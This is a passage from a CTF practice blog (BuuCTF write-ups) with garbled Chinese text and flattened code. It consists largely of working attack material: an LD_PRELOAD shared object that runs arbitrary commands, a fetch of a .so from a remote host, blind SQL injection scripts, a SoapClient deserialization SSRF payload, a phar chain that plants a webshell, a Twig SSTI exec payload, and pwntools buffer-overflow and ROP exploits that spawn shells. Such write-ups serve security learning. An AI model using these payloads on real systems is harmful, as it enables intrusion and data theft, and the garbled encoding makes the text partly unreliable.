ä¸ºäº†Bypass disable_function, å…ˆè®©èšå‰‘è¿ä¸Šæ¥, å†™shell 1User-Agent: print_r(file_put_contents(\"/tmp/a.php\",'')) ç„¶ååŒ…å« 1User-Agent: include(\"/tmp/a.php\"); èšå‰‘å°±å¯ä»¥è¿ä¸Šæ¥äº† è¿™é‡Œå…ˆæä¾›ä¸€ä¸ªæ‡’äººæ–¹æ³• ä½¿ç”¨èšå‰‘çš„æ’ä»¶ å°±å¯ä»¥ç›´æ¥ç»•è¿‡äº†hhh, å½“ç„¶æˆ‘ä»¬ä¸èƒ½è¿™æ ·, è¿˜æ˜¯è¦ä¸€æ­¥ä¸€æ­¥æ¥ æ¨èä»¥ä¸‹ä¸¤ç¯‡æ–‡ç«  https://www.anquanke.com/post/id/175403 https://www.freebuf.com/articles/web/192052.html æ— è®ºå­¦ä»€ä¹ˆéƒ½èƒ½åœ¨ä¸€å¶é£˜é›¶å¸ˆå‚…çš„æ–‡ç« ä¸­æ‰¾åˆ°.jpg æˆ‘ä»¬çŸ¥é“å¦‚æœè¦åŠ è½½LD_PRELOADéœ€è¦æ–°èµ·è¿›ç¨‹, åœ¨phpè§£é‡Šå™¨è¿è¡Œä¸­, ç¬¬ä¸€æ¬¡æ‰§è¡Œexecveæ˜¯è°ƒç”¨phpè§£é‡Šå™¨, å¦‚æœå‡ºç°ç¬¬äºŒä¸ªexecveå°±æ˜¯æœ‰æ–°è¿›ç¨‹çš„ç”Ÿæˆ, è¿™é‡Œçš„æµ‹è¯•phpå¦‚ä¸‹ 12&1|grep -C3 execve å¯ä»¥çœ‹åˆ°ç¡®å®å‡ºç°äº†å¤šä¸ªexecve, åŒæ ·çš„å‡½æ•°è¿˜æœ‰imap_open è¿™é‡Œæˆ‘å°±ç›´æ¥ä½¿ç”¨äº†å‰é¢é“¾æ¥ä¸­çš„æ–‡ä»¶ é¦–å…ˆæ˜¯exp.c 123456789101112131415161718192021222324252627#define _GNU_SOURCE#include #include #include extern char** environ;__attribute__ ((__constructor__)) void preload (void){ // get command line options and arg const char* cmdline = getenv(\"EVIL_CMDLINE\"); // unset environment variable LD_PRELOAD. // unsetenv(\"LD_PRELOAD\") no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], \"LD_PRELOAD\")) { environ[i][0] = '\\0'; } } // executive command system(cmdline);} åœ¨linuxä¸­ç¼–è¯‘ 1gcc -shared -fPIC exp.c -o exp_x64.so exp.php 12345678910111213141516171819 ç„¶åé€šè¿‡èšå‰‘ä¸€èµ·ä¸Šä¼ ä¸Šå», å¸¦ä¸Šå‚æ•°è®¿é—®å³å¯ ä¸ç”¨èšå‰‘çš„è¯å¯ä»¥é€šè¿‡å¼€å¦ä¸€å°linux_labæ¥ä¼  1copy(\"http://ip:port/exp.so\",\"/tmp/exp.so\"); æ–¹æ³•å¾ˆå¤š, èšå‰‘æ˜¯æ¯”è¾ƒæ–¹ä¾¿çš„æ–¹æ³• [SUCTF 2019]EasyWebæºç å¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373818){ die('One inch long, one inch strong!');}if ( preg_match('/[\\x00- 0-9A-Za-z\\'\"\\`~_&.,|=[\\x7F]+/i', $hhh) ) die('Try something else!');$character_type = count_chars($hhh, 3);if(strlen($character_type)>12) die(\"Almost there!\");eval($hhh);?> ç»•è¿‡æ­£åˆ™é¦–å…ˆæœ‰é•¿åº¦å’Œæ­£åˆ™çš„è¿‡æ»¤, æˆ‘ä»¬éœ€è¦å…ˆæƒ³åŠæ³•æ„é€ ä¸€ä¸ª$_GETå‡ºæ¥, fuzzä¸€ä¸‹ç‰¹æ®Šç¬¦å·, å‘ç°è¿˜æœ‰^, é‚£å¤§æ¦‚å°±æ˜¯å¼‚æˆ–æ¥ç»•è¿‡æ­£åˆ™äº†, è€Œæˆ‘ä»¬åœ¨ä¸‹é¢è¿˜å¯ä»¥çœ‹åˆ°æœ‰ä¸ª 1$character_type = count_chars($hhh, 3); ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨è¶…è¿‡12ç§å­—ç¬¦ é‚£å…ˆç”¨è„šæœ¬æ„é€ ä¸€ä¸‹ 1234567891011121314151617181920import repattern = re.compile('[\\x00- 0-9A-Za-z\\'\"\\`~_&.,|=[\\x7F]+', re.I)payload = \"_GET\"for i in range(1, 256): if pattern.match(chr(i)): continue res = f\"%{i:02x}\" * len(payload) res += \"^\" f = False for j in payload: new = ord(j)^i if pattern.match(chr(new)): f = True break res += f\"%{ord(j)^i:02x}\" if f: continue print(res) ç„¶åä»è¾“å‡ºä¸­éšä¾¿é€‰ä¸€ä¸ªæ¥æ„é€  1${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo æ–‡ä»¶ä¸Šä¼ è¿™é‡Œå…¶å®å°±æ˜¯è®©ä½ å»è°ƒç”¨get_the_flag() é‚£ä¹ˆæˆ‘ä»¬æ¥åº·åº·è¿™ä¸ªå‡½æ•°å¹²å•¥ 1234567891011121314function get_the_flag(){ ... if(!empty($_FILES[\"file\"])){ $tmp_name = $_FILES[\"file\"][\"tmp_name\"]; $name = $_FILES[\"file\"][\"name\"]; $extension = substr($name, strrpos($name,\".\")+1); if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); if(mb_strpos(file_get_contents($tmp_name), ' start: if attack(i, mid): start = mid + 1 else: end = mid mid = (end + start) // 2 sleep(0.02) flag += chr(mid) print(flag)if __name__ == \"__main__\": # try_length() main() ç„¶åå°±èƒ½æ³¨å‡ºå¯†ç  ç™»é™†åå¯ä»¥çœ‹åˆ°æœ‰ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ ä¸Šä¼ åæç¤ºä¼šè®°å½•æ–‡ä»¶å, å¹¶ä¸”logæ–‡ä»¶ä¸ºphpæ ¼å¼, ä½†æ˜¯ç”±äºå­˜åœ¨/php/içš„è¿‡æ»¤, ä½¿ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ 1 åé¢å°±ç›´æ¥cat /flag [HITCON 2017]SSRFme12345678910111213141516171819 () = => like ç„¶åå°±å¯ä»¥é¡ºåˆ©æ³¨å‡ºè¡¨åå’Œåˆ—å 1-1'^(updatexml(1,concat(0x7e,(SELECT(group_concat(column_name))from(information_schema.columns)where((table_schema)like(database()))),0x7e),1))^'1 è¿™é‡Œå¯ä»¥çœ‹åˆ°åœ¨æ‹¿flagçš„æ—¶å€™å‡ºç°äº†é•¿åº¦ä¸å¤Ÿ 1-1'^(updatexml(1,concat(0x7e,(SELECT((group_concat(password)))from(H4rDsq1)),0x7e),1))^'1 åŠ ä¸Šä¸ªreverseå³å¯ 1-1'^(updatexml(1,concat(0x7e,(SELECT(reverse(group_concat(password)))from(H4rDsq1)),0x7e),1))^'1 æ‰‹åŠ¨æ‹¼æ¥å³å¯å¾—åˆ°flag [LCTF 2018]bestphpâ€™s revengeindex.php 123456789101112 flag.php 1234567session_start();echo 'only localhost can get flag!';$flag = 'LCTF{*************************}';if($_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\"){ $_SESSION['flag'] = $flag; }only localhost can get flag! æºç å¦‚ä¸Š, å¤§æ¦‚çš„æƒ³æ³•æ˜¯é€šè¿‡ 1call_user_func($_GET['f'], $_POST); è¿™ä¸€è¡Œè¿›è¡Œå˜é‡è¦†ç›–, ç„¶ååœ¨æœ€åä¸€è¡Œæ‰§è¡Œä»£ç  é¦–å…ˆå°è¯•å°†$bè¦†ç›–æˆvar_dump ä½†æ˜¯è¿™é‡Œå¤±è´¥äº†, ä¸å¤ªæ‡‚ä¸ºä»€ä¹ˆæ²¡æœ‰è¦†ç›–æˆåŠŸ æŸ¥äº†ä¸€ä¸‹ç›¸åº”çš„wp, ä¹Ÿæ˜¯ç”¨çš„extract, è¿™å°±å¾ˆè¿·äº† lctf2018-bestphps-revenge-è¯¦ç»†é¢˜è§£ æ¨èä¸€ä¸‹smi1eå¸ˆå‚…çš„wp, ä»¥ä¸‹ç›´æ¥å¼•ç”¨éƒ¨åˆ† æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»£ç ä¸­çš„session_start()ååˆ†çªå…€, å¯ä»¥è¯´æ²¡æœ‰å•¥ç”¨, é‚£åº”è¯¥å°±æ˜¯çªç ´å£, åœ¨phpä¸­, sessionçš„å­˜å‚¨ä½ç½®æ˜¯åœ¨æ–‡ä»¶ä¸­, å¹¶ä¸”æœ‰ä¸€æ¬¡ååºåˆ—åŒ–çš„è¿‡ç¨‹, è¿™å°±æœ‰äº†sessionååºåˆ—åŒ–çš„æ¼æ´ phpçš„ååºåˆ—åŒ–å¼•æ“æœ‰ä¸‰ç§ php: 1name|s:5:\"Smi1e\"; php_serialize: 1a:1:{s:4:\"name\";s:5:\"Smi1e\";} php_binary: 1names:5:\"Smi1e\"; å¯ä»¥çœ‹åˆ°ä¸åŒçš„å¼•æ“çš„ååºåˆ—åŒ–æ–¹å¼ä¸åŒ, ç±»ä¼¼äºååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸, å¦‚æœä½¿ç”¨äº†ä¸åŒçš„å¼•æ“, ä¹Ÿå¯èƒ½å‡ºç°ååºåˆ—åŒ–é€ƒé€¸, ä¾‹å¦‚ 1a:1:{s:4:\"name\";s:5:\"|O:5:\"Smi1e\":1:{s:4:\"test\";s:3:\"AAA\";}\";} åœ¨phpå¼•æ“ä¸­ä¼šä»|åˆ†éš”, a:1:{s:4:\"name\";s:5:\"ä½œä¸ºkey, O:5:\"Smi1e\":1:{s:4:\"test\";s:3:\"AAA\";}\";}ä½œä¸ºvalue, æœ€åä¼šæŠŠå®ƒè¿›è¡Œunserializeå¤„ç†, è¿™å°±å‡ºç°äº†æ¼æ´ ä½†æ˜¯ç©ºæœ‰æ¼æ´ä¹Ÿæ²¡æœ‰ç”¨, æˆ‘ä»¬éœ€è¦å¯¹flag.phpè¿›è¡Œssrf, ç”±äºé¢˜ç›®æ²¡æœ‰ç±»å¯¹è±¡, æˆ‘ä»¬éœ€è¦ä»åŸç”Ÿçš„ç±»å…¥æ‰‹ https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0 å¯ä»¥çœ‹åˆ°SoapClientç±»å°±ç¬¦åˆè¿™ä¸ªç‰¹ç‚¹, æ‰€ä»¥è¿™é‡Œçš„æ€è·¯å°±æ˜¯ ç”ŸæˆSoapClientçš„payload å…ˆè®¾ç½®ä¸ºphp_serializeå¼•æ“, å°†payloadæ³¨å…¥ å†æ¬¡è®¿é—®, è°ƒç”¨SoapClientç±»ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__call__, ä»è€Œå®ç°ssrf ä¸€æ­¥æ­¥æ¥, é¦–å…ˆæ˜¯ç”Ÿæˆpayload 123456 $path, 'location' => $path)); $payload = serialize($o); echo \"|\".$payload; ç”Ÿæˆ 1|O:10:\"SoapClient\":4:{s:3:\"uri\";s:25:\"http://127.0.0.1/flag.php\";s:8:\"location\";s:25:\"http://127.0.0.1/flag.php\";s:15:\"_stream_context\";i:0;s:13:\"_soap_version\";i:1;} ç„¶åè®¿é—® å†åˆ©ç”¨call_user_funcçš„ç‰¹æ€§, å½“ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ•°ç»„æ—¶, æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä½œä¸ºç±»å, ç¬¬äºŒä¸ªå…ƒç´ ä¸ºæ–¹æ³• è¿™é‡Œçš„è®¿é—®å°±æ˜¯ 1call_user_func(array(\"SoapClient\", \"welcome_to_the_lctf2018\")); å°±ä¼šè§¦å‘__call__, å®ç°ssrf æœ€åè®¿é—®index.php, å°†è·å–åˆ°çš„sessionå¡«å…¥cookieå³å¯ ç­¾åˆ°é¢˜éƒ½è¿™ä¹ˆæœ‰æ°´å¹³, lctfå¤ªé¡¶äº† [RoarCTF 2019]Online Proxy å¯ä»¥çœ‹åˆ°æœ‰ip, é‚£ä¹ˆæœ‰å‡ ç§å¯èƒ½ SSTI å‘½ä»¤æ³¨å…¥ sqlæ³¨å…¥ ç»“åˆæ–‡å­—åº”è¯¥å°±æ˜¯sqlæ³¨å…¥äº†, ä¸è¿‡è¿™é‡Œæ³¨å…¥çš„æƒ…å†µæ¯”è¾ƒç‰¹åˆ«, éœ€è¦ä¸‰æ¬¡è®¿é—®æ‰ä¼šå‡ºç»“æœ è®¿é—®, ç¨‹åºè®°å½•IP ç¬¬äºŒæ¬¡è®¿é—®, å¦‚æœä¸åŒ, åˆ™å°†ä¸Šæ¬¡çš„IPæ”¾å…¥æ•°æ®åº“ ç¬¬ä¸‰æ¬¡è®¿é—®, å¦‚æœä¸ç¬¬äºŒæ¬¡ç›¸åŒ, åˆ™ä»æ•°æ®åº“æŸ¥è¯¢ä¸Šæ¬¡çš„IP è¿™å°±æ˜¯äºŒæ¬¡æ³¨å…¥äº†, è„šæœ¬å¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import requestsimport refrom time import sleepurl = \"http://node3.buuoj.cn:25528/\"proxies = { \"http\": \"127.0.0.1:8080\"}static_headers = { \"X-Forwarded-For\": \"111\",}session = requests.Session()def test(cur, mid): # table: F4l9_D4t4B45e payload = \"-1' and (ascii(substr((select reverse(group_concat(schema_name)) from information_schema.schemata),%d,1))>%d)^'0\" % (cur, mid) # table: F payload = \"-1' and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='F4l9_D4t4B45e'),%d,1))>%d)^'0\" % (cur, mid) payload = \"-1' and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='F4l9_D4t4B45e'),%d,1))>%d)^'0\" % (cur, mid) payload = \"-1' and (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),%d,1))>%d)^'0\" % (cur, mid) headers = { \"X-Forwarded-For\": payload, } res = session.get(url, headers=headers, timeout=5) res = session.get(url, headers=static_headers, timeout=5) res = session.get(url, headers=static_headers, timeout=5).text # print(res) result = re.findall(\"(?%d)\" % (cur, mid) payload = \"0^(ascii(substr((select(reverse(group_concat(table_name)))from(information_schema.tables)),%d,1))>%d)\" % (cur, mid) payload = \"0^(ascii(substr((select(reverse(group_concat(column_name)))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)\" % (cur, mid) payload = \"0^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)\" % (cur, mid) res = session.get(f\"{url}?id={payload}\", timeout=5).text if \"Click\" in res: return True return False # print(result)def main(): flag = \"\" for i in range(172, 220): end = 127 start = 31 mid = (end + start) // 2 while end > start: if test(i, mid): start = mid + 1 else: end = mid mid = (end + start) // 2 sleep(0.05) flag += chr(mid) print(flag)if __name__ == \"__main__\": # attack() # test() main() [ByteCTF 2019]EZCMSç¬¬ä¸€æ­¥æ˜¯hashæ‹“å±•æ”»å‡» å…ˆéšä¾¿ç™»å½•ä¸€ä¸‹, å¯ä»¥åœ¨cookieä¸­çœ‹åˆ° 1hash=52107b08c0f3342d2153ae1d68e6262c ç¿»ä¸€ä¸‹æºç , è¿™é‡Œæ˜¯ 12$secret = \"E3ry7Hjq\";setcookie(\"hash\", md5($secret.\"adminadmin\")); åœ¨éªŒè¯çš„åœ°æ–¹, éªŒè¯ 1234567891011function is_admin(){ $secret = \"E3ry7Hjq\"; $username = $_SESSION['username']; $password = $_SESSION['password']; if ($username == \"admin\" && $password != \"admin\"){ if ($_COOKIE['user'] === md5($secret.$username.$password)){ return 1; } } return 0;} é‚£ä¹ˆåªéœ€è¦åœ¨hashpumpé‡Œé¢ ç„¶åæ›¿æ¢æˆ% 1admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admin ç™»é™†åå°±æ˜¯adminäº† ç„¶åç»§ç»­çœ‹æºç , è¿™é“é¢˜ä¸éš¾çœ‹å‡ºæ˜¯ä¸ªæ„é€ popé“¾çš„é¢˜, å¯ä»¥çœ‹åˆ°åœ¨config.phpé‡Œé¢ Fileç±»å­˜åœ¨ä¸€ä¸ª__destruct é‡Œé¢ä¼šè°ƒç”¨check->upload_file åœ¨Profileç±»ä¸­å­˜åœ¨ä¸€ä¸ª__callå‡½æ•°, å¯ä»¥è°ƒç”¨admin->open, é‚£ä¹ˆå¦‚æœæˆ‘ä»¬èƒ½æ‰¾åˆ°æŸä¸ªç±»çš„openå¯ä»¥åˆ é™¤æ–‡ä»¶, ä¹Ÿå°±æ˜¯ç¨‹åºé»˜è®¤ç”Ÿæˆçš„.htaccess, å°±å¯ä»¥RCEäº†, è¿™ä¸ªç±»å°±æ˜¯ZipAchrive https://www.anquanke.com/post/id/95896#h2-4 ç°åœ¨ï¼Œæˆ‘ä»¬åœ¨æœ¬åœ°å»æµ‹è¯•æ¯ä¸ªç±»çš„è¡Œä¸ºã€‚ç»è¿‡ä¸€æ®µæ—¶é—´çš„æµ‹è¯•ä¹‹åï¼Œæˆ‘å‘ç°ï¼ŒZipArchive->openæ–¹æ³•å¯ä»¥åˆ é™¤ç›®æ ‡æ–‡ä»¶ï¼Œå‰ææ˜¯æˆ‘ä»¬éœ€è¦å°†å…¶ç¬¬äºŒä¸ªå‚æ•°è®¾å®šä¸ºâ€œ9â€ã€‚ ä¸ºä»€ä¹ˆè¦è®¾å®šä¸º9å‘¢ï¼ŸåŸå› åœ¨äºï¼Œ ZipArchive->open()çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯â€œæŒ‡å®šå…¶ä»–é€‰é¡¹â€ã€‚è€Œ9å¯¹åº”çš„æ˜¯ZipArchive::CREATE | ZipArchive::OVERWRITEã€‚ç”±äºZipArchiveæ‰“ç®—è¦†ç›–æˆ‘ä»¬çš„æ–‡ä»¶ï¼Œæ‰€ä»¥å°±ä¼šå…ˆå¯¹å…¶è¿›è¡Œåˆ é™¤ã€‚åœ¨æ­¤ï¼Œæ„Ÿè°¢@pagabucå¸®åŠ©æˆ‘ä»¬è§£é‡Šäº†è¿™ä¸€å‚æ•°çš„å…·ä½“æ„ä¹‰ã€‚ é‚£ä¹ˆç°åœ¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ZipArchive->open()æ¥åˆ é™¤.htaccessæ–‡ä»¶ã€‚ æ„é€ é“¾å¦‚ä¸‹ 1File -> __destruct -> Profile -> upload_file(ä¸å­˜åœ¨) -> __call -> ZipArchive -> open ç”Ÿæˆçš„è„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536373839admin = $z;$f = new File();$f->checker = $p;unlink(\"1.phar\");$phar = new Phar(\"1.phar\"); //åç¼€åå¿…é¡»ä¸ºphar$phar->startBuffering();// setStub(\"GIF89a\" . \"\"); //è®¾ç½®stub$phar->setMetadata($f); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar->addFromString(\"test.txt\", \"test\"); //ç­¾åè‡ªåŠ¨è®¡ç®—$phar->stopBuffering(); å¯¹äºå¦‚ä½•ç»•è¿‡pharåè®®çš„è¿‡æ»¤å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç«  https://blog.zeddyu.info/2019/08/24/SUCTF-2019/#php-filter zeddå¸ˆå‚…çš„æ–‡ç« éƒ½å†™çš„å¾ˆå¥½ é€šè¿‡phpä¼ªåè®®æ¥ç»•è¿‡ 1php://filter/read=convert.base64-encode/resource=phar:// è€Œè¿™é‡Œæ°å¥½æœ‰ä¸€ä¸ªè§¦å‘çš„å‡½æ•° é‚£ä¹ˆå°±å¯ä»¥å¼€å§‹äº† ç”Ÿæˆwebshell, ç”±äºevalæ— æ³•åŠ¨æ€æ„é€ , è¿™é‡Œå°±ç›´æ¥è¿™æ ·äº† 123 ä¸Šä¼ webshell ç”Ÿæˆæˆ‘ä»¬çš„pharæ–‡ä»¶å¹¶ä¸Šä¼  è®¿é—®view.php, è¿™é‡Œéœ€è¦æ³¨æ„pharæ–‡ä»¶çš„è·¯å¾„ 1http://078e3606-5996-4c33-9dff-00db1aaa228f.node3.buuoj.cn/view.php?filename=eec2d95bc618625503306c10fad5d37d.phar&filepath=php://filter/resource=phar://./sandbox/2c67ca1eaeadbdc1868d67003072b481/eec2d95bc618625503306c10fad5d37d.phar rce [BJDCTF2020]Cookie is so stableè¿™é“é¢˜ä»¥ä¸ºä»–ç”¨çš„æ˜¯smarty, è¿˜ä»¥ä¸ºä»–çš„è¿™å¥è¯æ˜¯ç”¨äº†waf æµ‹äº†åŠå¤©å‘ç°ä¸é è°±, åŸæ¥è¿™æ˜¯ä¸ªtwig ä¸Šç½‘æŠ„ä¸ªpayloadå°±å¯ä»¥ç›´æ¥æ‰“äº†â€¦. å…·ä½“å¯ä»¥çœ‹è¿™é‡Œ ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹SSTIæ¼æ´ 1{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /flag\")}} æœç„¶è¿˜æ˜¯è¦æµ‹ä¸€æµ‹æ˜¯ä»€ä¹ˆå¼•æ“å…ˆ [BJDCTF2020]EasySearch123456789101112131415161718192021222324252627282930313233343536 è·‘(æŠ„)å‡ºæ¥çš„md5æ˜¯ 12020666 åé¢åˆ©ç”¨çš„æ˜¯apacheçš„ssiæ¼æ´æ³¨å…¥ SSIæ³¨å…¥æ¼æ´æ€»ç»“ flagåœ¨ä¸Šä¸€å±‚ [BJDCTF2020]EzPHP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051 ç»•è¿‡ 1preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i', $_SERVER['QUERY_STRING']) urlç¼–ç å³å¯ ç»•è¿‡ 1234if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { $file = $_GET[\"file\"]; echo \"Neeeeee! Good Job!\"; } å› ä¸ºæ­£åˆ™æ²¡æœ‰/g, æ·»åŠ ä¸€ä¸ª%0aå°±å¯ä»¥ç»•è¿‡äº† ç»•è¿‡ 123456if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match('/[a-zA-Z]/i', $value)) die('fxck you! I hate English!'); } } è¿™é‡Œçš„è¯æ˜¯åˆ©ç”¨POSTå‚æ•°æ¥è¦†ç›–GETå‚æ•°, æˆ‘ä»¬çŸ¥é“POSTå’ŒGETçš„å‚æ•°æ˜¯åˆ†åˆ«æ”¾åœ¨ä¸åŒçš„æ•°ç»„çš„, ä½†æ˜¯åœ¨$_REQUESTä¸­, æ˜¯åˆå¹¶åœ¨ä¸€èµ·çš„, å¹¶ä¸”ä¼˜å…ˆçº§å¦‚ä¸‹ 1GETb.txt\")); ç¬¬äºŒç¯‡ç»“æŸäº†, åé¢å°½é‡åˆ·ä¸€äº›è´¨é‡æ›´é«˜çš„é¢˜å§ æœ¬æ–‡ä½œè€…: cjm00næœ¬æ–‡åœ°å€: https://cjm00n.top/2020/02/14/BuuCTFåˆ·é¢˜è®°å½•2/ ç‰ˆæƒå£°æ˜: é™¤ç‰¹åˆ«è¯´æ˜å¤–ï¼Œæ‰€æœ‰æ–‡ç« å‡é‡‡ç”¨ CC BY 4.0 è®¸å¯åè®®ï¼Œè½¬è½½è¯·å…ˆå–å¾—åŒæ„ã€‚","link":"/2020/02/14/BuuCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/"},{"title":"Buuåˆ·é¢˜è®°å½•3","text":"æ›´æ–°ä¸­ [ISITDTU 2019]EasyPHPå…ˆçœ‹æºç  index.php123456789101112 ret ä¹Ÿå°±æ˜¯-0x80-0x8, payloadå¦‚ä¸‹ 12345678from pwn import *io = remote(\"node3.buuoj.cn\",26279)io.recvline()payload = b\"a\" * 0x88payload += p64(0x400596)io.send(payload)io.interactive() jarvisoj_level1 å¯ä»¥çœ‹åˆ°æ²¡æœ‰å¼€NXå †æ ˆä¿æŠ¤, mainå‡½æ•°å¦‚ä¸‹ è·Ÿè¿›vulenrable_function è¿™æ¬¡æ²¡æœ‰äº†åé—¨å‡½æ•°, ä½†æ˜¯NXä¿æŠ¤æ²¡å¼€, å°±å¯ä»¥å°†shellcodeå†™å…¥å †æ ˆ, å†å°†åœ°å€æŒ‡å‘å †æ ˆä¸Šshellcodeçš„åœ°å€, å°±å¯ä»¥æ‰§è¡Œäº†, bufçš„å¤§å°ä¸º0x8c æƒ³æ³•æ˜¯å¾ˆç¾å¥½çš„, buuojä¸Šé¢å´ä¸€ç›´æ‰“ä¸é€š, æ„Ÿè§‰ä¸Šé¢çš„æ–‡ä»¶å’Œç»™çš„é™„ä»¶ä¸ä¸€æ ·, æ‰“äº†ä¸€ä¸‹jarvisojçš„å¯ä»¥é€š 123456789101112131415from pwn import *io = remote(\"node3.buuoj.cn\",27940)# io = remote(\"pwn2.jarvisoj.com\",\"9877\")context.log_level = 'debug'addr = int(io.recvline()[len(\"What's this:\"):-2],16)print(addr)shellcode = asm(shellcraft.sh())# shellcode=b\"\\x31\\xc0\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xb0\\x0b\\xcd\\x80\"payload = shellcodepayload += \"a\" * (0x8c - len(shellcode))payload += p64(addr)io.send(payload)io.interactive() çœ‹äº†ä¸‹å—æ¢¦å¸ˆå‚…çš„exp, ä¸æ˜¯å¾ˆæ‡‚, åé¢å†ç ”ç©¶çœ‹çœ‹, èœé¸¡pwnæ‰‹çš„å¿ƒç†å—åˆ°äº†å·¨å¤§çš„åˆ›ä¼¤ jarvisoj_level2å­¦ä¹ äº†ä¸€ä¸‹å—æ¢¦å¸ˆå‚…çš„expå†™æ³•, è¿™é¢˜å…¶å®å°±æ˜¯æ‰¾systemç„¶åæ‰§è¡Œå°±å¯ä»¥äº† æˆ–è€…è¿™é‡Œ expå¦‚ä¸‹ 1234567891011121314151617181920212223242526from pwn import *context.log_level = 'debug'context.arch = 'i386'elf = ELF(\"./level2\")sh = 0lib = 0def exp(ip, port, debug=0): global sh if debug: sh = process(\"./level2\") else: sh = remote(ip, port) bin_sh_addr = elf.search(\"/bin/sh\").next() # system_addr = elf.[\"system\"] system_addr = 0x804849E # print(bin_sh_addr) print(system_addr) payload = \"a\" * (0x88 + 0x4) payload += p32(system_addr) payload += p32(bin_sh_addr) sh.send(payload) sh.interactive()if __name__ == '__main__': exp(\"node3.buuoj.cn\", 26653, 0) jarvisoj_level2_x6432ä½å’Œ64ä½åœ¨å‡½æ•°ä¼ å‚çš„åœ°æ–¹æœ‰æ‰€ä¸åŒ, 64ä½å‰6ä¸ªå‚æ•°æ˜¯æ”¾åœ¨å¯„å­˜å™¨ä¸Š, ç¬¬ä¸€ä¸ªæ˜¯rdi, æ‰€ä»¥æˆ‘ä»¬è¦æƒ³åŠæ³•æŠŠ/bin/shä¼ å…¥rdi, è¿™é‡Œéœ€è¦ç”¨åˆ°ROPgadget å¯ä»¥çœ‹åˆ°ç¨‹åºæ‰¾åˆ°äº†ä¸€äº›å¯ç”¨çš„æ±‡ç¼–è¯­å¥, æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹çº¢æ¡†ä¸­çš„è¯­å¥ 1pop rdi ; ret pop rdi: å°†æ ˆé¡¶çš„æ•°æ®å¼¹å‡º, ä¼ ç»™rdi ret: å°†æ ˆé¡¶çš„æ•°æ®å¼¹å‡º, è·³è½¬åˆ°è¯¥åœ°å€ æˆ‘ä»¬ä¾æ¬¡ä¼ å…¥/bin/shå’Œsystemçš„åœ°å€, æ ˆä¸Šçš„çŠ¶æ€å¦‚ä¸‹ 12/bin/shsystem é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é¡ºåˆ©çš„å°†rdiåŠ è½½ä¸º/bin/sh æ„é€ expå¦‚ä¸‹ 12345678910111213141516171819202122232425from pwn import *context.log_level = 'debug'context.arch = 'amd64'elf = ELF(\"./level2_x64\")sh = 0lib = 0def exp(ip, port, debug=0): global sh if debug: sh = process(\"./level2_x64\") else: sh = remote(ip, port) pop_rdi_ret_addr = 0x4006b3 bin_sh_addr = elf.search(\"/bin/sh\").next() system_addr = 0x400603 payload = \"a\" * (0x88) payload += p64(pop_rdi_ret_addr) payload += p64(bin_sh_addr) payload += p64(system_addr) sh.send(payload) sh.interactive()if __name__ == '__main__': exp(\"node3.buuoj.cn\", 25012, 0) jarvisoj_level3 çœ‹ä¸€ä¸‹vulnå‡½æ•° è¿™æ¬¡å¼€å¯äº†NXä¿æŠ¤, ä¹Ÿæ²¡æœ‰åé—¨å‡½æ•°, å°±åªèƒ½å»libcé‡Œé¢æ‰¾äº† ä½†æ˜¯è¿™é‡Œå‘çš„åœ°æ–¹å°±æ˜¯, æˆ‘å»ç¿»äº†é¢˜ç›®githubåœ°å€çš„libcæ˜¯2.19, å®é™…ä¸Šå¹¶ä¸æ˜¯, ç„¶åå°±ä¸€ç›´time_outâ€¦ æˆ‘ä»¬æƒ³è¦åˆ©ç”¨libcä¸­è‡ªå¸¦çš„å‡½æ•°, éœ€è¦å…ˆæ‰¾åˆ°åŸºå€, è€Œwriteå‡½æ•°å°±å¯ä»¥ç”¨æ¥æ³„éœ²åœ°å€, ç„¶åä¸æˆ‘ä»¬æœ¬åœ°çš„ç›¸å‡å°±èƒ½æ±‚å‡ºåŸºå€, 